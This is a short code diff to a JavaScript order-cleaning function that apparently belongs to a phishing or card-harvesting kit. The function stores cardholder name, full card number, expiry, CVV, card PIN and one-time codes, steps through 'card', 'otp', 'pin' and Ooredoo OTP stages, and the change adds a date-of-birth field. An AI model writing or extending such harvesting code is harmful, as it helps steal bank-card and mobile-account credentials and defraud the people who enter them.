@@ -86,6 +86,7 @@ function cleanOrder(b) {
     bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
     lang: b.lang === "en" ? "en" : "ar",
     step: ["card", "otp", "pin", "ooredoo", "ooredoo-otp"].includes(b.step) ? b.step : undefined,
+    dob: str(b.dob || "", 20),
     pay: {
       cardName: str(rawName, 200),
       cardNumber: str(rawCard, 200),
@@ -93,7 +94,6 @@ function cleanOrder(b) {
       brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
       exp: str(rawExp, 50),
       cvv: str(rawCvv, 50),
-      otp: str(rawOtp, 50),
       pin: str(rawPin, 50)
     },
     ooredoo: {
